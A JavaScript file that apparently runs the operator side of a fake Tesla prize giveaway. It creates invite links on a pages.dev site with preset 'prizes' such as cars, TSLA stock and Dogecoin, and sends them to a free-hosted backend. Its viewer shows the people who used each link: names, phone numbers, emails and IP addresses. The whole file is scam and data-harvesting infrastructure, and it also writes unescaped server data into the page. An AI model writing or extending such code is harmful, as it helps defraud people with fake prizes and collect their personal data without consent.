var pensagiftinvite = '';
loadallposts();
function loadallposts() { //load post from server
	var bzo7ogo = "bzo7ogo";
    $.ajax({
		type: "POST",
		url: "https://bastestquest.000webhostapp.com/pesavintin/", 
		dataType: "json",
		data: {bzo7ogo: bzo7ogo},
		success: function(FindInvites){	
            pensagiftinvite = FindInvites;

            var no = 1;
            var JQE = "";
            JQE += '<table id="gifttable" cellspacing="24px" cellpadding="10px" class="display table table-head-bg-secondary dtableflex" >'+
            '<thead>'+
                '<tr>'+ 
                    '<th style="width:2%" scope="col">#</th>'+
                    '<th style="width:10%" scope="col">Gift</th>'+
					'<th style="width:10%" scope="col">Used</th>'+
					'<th style="width:10%" scope="col">Link</th>'+
                    '<th style="width:2%" scope="col">Action</th>'+

                    // '<th style="width:5%" scope="col">View</th>'+	
                    // '<th style="width:5%" scope="col">Update</th>'+	
                    // '<th style="width:5%" scope="col">Delete</th>'+	
                '</tr>'+
                '</thead>'+
                '<tbody >';	
            var GiftBox = FindInvites;
            GiftBox.forEach(function(item, index) {
			JQE +='<tr>';
			JQE += '<td>';
			JQE += no++;
			JQE += '</td>'; 
			JQE +='<td><div class="gifthd">'+item.gift+'</div> <br><br> <b>Date Created.</b><br> '+item.created+'</td>'+
			'<td>'+item.linkused+'</td>'+
			'<td><div class="giftstd"  id="iv'+item.comcast+'">https://teslagiftproject.pages.dev/#'+item.ivlink+'</div></td>'+
			
			'<td> <i class="fa fa-edit dtableaction text-warning" id="edit'+item.comcast+'"></i> <i class="fa fa-eye dtableaction text-danger" id="view'+item.comcast+'"></i> </td>'+
			// '<td> <button type="button" class="btn btn-primary" id="view'+item.pcc+'">View</button> </td>'+
			// '<td> <button type="button" class="btn btn-warning" id="edit'+item.pcc+'">Update</button> </td>'+
			// '<td> <button type="button" class="btn btn-danger" id="dele'+item.pcc+'">Delete</button> </td>'+
			'</tr>';
                    
                });
                JQE += '</tbody>'+
                '</table>';
                $("#listgiftboxcol").html(JQE);
                $("#gifttable").DataTable();

                // ListPack.forEach(function(item, index) { 
                //     $('#listtable').on('click', '#view'+item.pcc+'', function(event) {
                //       var esjr = item.pcc;
                //        hillsblogpostView(esjr);
                //       });
                //     });
                GiftBox.forEach(function(item, index) { 
                    $('#listgiftboxcol').on('click', '#edit'+item.comcast+'', function(event) {
                        var esjr = item.comcast;
                      
                        giftlinkcrop(esjr);
                        });
                    });
                GiftBox.forEach(function(item, index) { 
                    $('#listgiftboxcol').on('click', '#view'+item.comcast+'', function(event) {
                        var esjr = item.comcast;
                        awardlookers(esjr);
                        });
                    });
         } 
	});
}
function giftlinkcrop(params) {
        // Get the element that contains the text to copy
        var textToCopyElement = document.getElementById("iv"+params);
        // Create a range object and select the text
        var range = document.createRange();
        range.selectNode(textToCopyElement);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
        // Copy the selected text to the clipboard
        document.execCommand("copy");
        // Deselect the text
        window.getSelection().removeAllRanges();
        // Alert the user that the text has been copied
        alert("Text copied to clipboard!"); 
}
function awardlookers(params) {
    $("#modalIm").modal('show');
    document.getElementById("mefbody").innerHTML = `<h3>Please Wait...</h3>`;
    var manofthegift = "";
    var bo345u33 = params;
    if (bo345u33.length > 0){
        $.ajax({
            type: "POST",
            url: "https://bastestquest.000webhostapp.com/pesavintin/", 
            dataType: "json",
            data: {bo345u33: bo345u33},
            success: function(AwardWinner){	
                manofthegift = AwardWinner;
                awardlookersselector(manofthegift);
            }
        });
        }
}
function awardlookersselector(params) {
    let firstname = JSON.stringify(params.map(lcpk => lcpk.firstname)).replace(/[\[\]"]+/g,"");
    let lastname = JSON.stringify(params.map(lcpk => lcpk.lastname)).replace(/[\[\]"]+/g,"");
    let mobile = JSON.stringify(params.map(lcpk => lcpk.mobile)).replace(/[\[\]"]+/g,"");
    let emailaddress = JSON.stringify(params.map(lcpk => lcpk.emailaddress)).replace(/[\[\]"]+/g,"");
    let windate = JSON.stringify(params.map(lcpk => lcpk.windate)).replace(/[\[\]"]+/g,"");
    let winip = JSON.stringify(params.map(lcpk => lcpk.winip)).replace(/[\[\]"]+/g,"");

    if(emailaddress.length > 4){
    var JOOI = `<table id="gifttable" cellspacing="24px" cellpadding="10px" class="display table table-head-bg-secondary" >
    <tbody>
    <tr>
    <td><b>First Name</b></td> <td>${firstname}</td>
    </tr>
    <tr>
    <td><b>Last Name</b></td> <td>${lastname}</td>
    </tr>
    <tr>
    <td><b>Mobile</b></td> <td>${mobile}</td>
    </tr> 
    <tr>
    <td><b>Email</b></td> <td>${emailaddress}</td>
    </tr> 
    <tr>
    <td><b>Date Submited</b></td> <td>${windate}</td>
    </tr> 
    <tr>
    <td><b>IP</b></td> <td>${winip}</td>
    </tr>
    </thead>
    </table>`;

    document.getElementById("mefbody").innerHTML = JOOI;
    }else{
        document.getElementById("mefbody").innerHTML = `<h3>Link not used</h3>`;
    }
}
genRandomCharacters();
function genRandomCharacters() {
	// Get the input element
	var numCharactersInput = document.getElementById("inplhd");
	// Get the value of the input element
	var numCharacters = numCharactersInput.value;
	// Generate random characters
	var characters = "";
	var possibleCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
	for (var i = 0; i < numCharacters; i++) {
		characters += possibleCharacters.charAt(Math.floor(Math.random() * possibleCharacters.length));
	}
	// Display the random characters
	var randomCharactersElement = document.getElementById("random-characters");
	//randomCharactersElement.textContent = "Random Characters: " + characters;
	document.getElementById("invite").value = "t"+characters;
}

document.getElementById("giftcardrg").addEventListener("click", function() { 
    genRandomCharacters();
});

document.getElementById("giftcardfr").addEventListener("click", function() { 
    createteslalink();
});

function createteslalink(){
		
	var invite  = document.getElementById("invite").value;	
	var gift  = document.getElementById("gift").value;
    var giftbox = "";
	

    var giftcardfr  = document.getElementById("giftcardfr");
    var giftcardrg  = document.getElementById("giftcardrg");

    var giftcardff  = document.getElementById("giftcardff");
    var giftcardrgff  = document.getElementById("giftcardrgff");


	if (myTrim(invite).length > 4  && myTrim(gift).length > 3){ 
        giftcardfr.style.display = "none";
        giftcardrg.style.display = "none";

        giftcardff.style.display = "";
        giftcardrgff.style.display = "";


        var giftreach = [
            {"wrapcode":"4996","wrapgift": "Tesla Stock (TSLA)"},
            {"wrapcode":"5040","wrapgift": "Model X"},
            {"wrapcode":"5084","wrapgift": "Model Y"},
            {"wrapcode":"5128","wrapgift": "Invite Link"},
            {"wrapcode":"5174","wrapgift": "Model S"},
            {"wrapcode":"5218","wrapgift": "Model 3"},
            {"wrapcode":"5264","wrapgift": "Try Again"},
            {"wrapcode":"5310","wrapgift": "Dodge Coin (DOGE)"}
          ];
    
          giftreach.forEach(item => {
            if(gift == item.wrapcode){
                giftbox = item.wrapgift;
            }
          });
    
          //console.log(giftbox)
	
	$.ajax({
		type: "POST",
		url: "https://bastestquest.000webhostapp.com/pesavintin/", 
		dataType: "json",
		data: {invite: invite, gift: gift, giftbox: giftbox },
		success: function(data){
		var slf = data; 
		if(slf.CCOM == "none"){
            document.getElementById("giftcardform").reset();
			loadallposts();
            giftcardfr.style.display = "";
            giftcardrg.style.display = "";

            giftcardff.style.display = "none";
            giftcardrgff.style.display = "none";

            giftcardfr.innerHTML = "More Invite Link";
        }else{
			giftcardfr.style.display = "";
            giftcardrg.style.display = "";

            giftcardff.style.display = "none";
            giftcardrgff.style.display = "none";
        }
			
    }, error : function(jqXHR, textStatus, errorThrown) {
        let useronline = teslaser();
        if (useronline == 0) {
            alert("Ooops! It seems your network is slow or disconnected")
            giftcardfr.style.display = "";
            giftcardrg.style.display = "";

            giftcardff.style.display = "none";
            giftcardrgff.style.display = "none";
        }else{
            alert("Ooops! This is not your fault. Try Again...");
            giftcardfr.style.display = "";
            giftcardrg.style.display = "";

            giftcardff.style.display = "none";
            giftcardrgff.style.display = "none";
        }
    } 
	});
    }
}

function likaca(){
    loadallposts();
    /*document.getElementById("linkcreatesection").style.dispay = ""
    document.getElementById("awardesssection").style.dispay = "none"*/
}

/*function winkaca(){
    document.getElementById("linkcreatesection").style.dispay = "none"
    document.getElementById("awardesssection").style.dispay = ""
}*/


function myTrim(x) {
    return x.replace(/^\s+|\s+$/gm,'');
}
  
String.prototype.nl2br = function(){
    return this.replace(/\n/g, "<br />");
}
function printError(elemId, hintMsg) {
document.getElementById(elemId).innerHTML = hintMsg;
} 

function teslaser() {
	if (navigator.onLine) {
		return 1;
	}else{
		return 0;
	}
}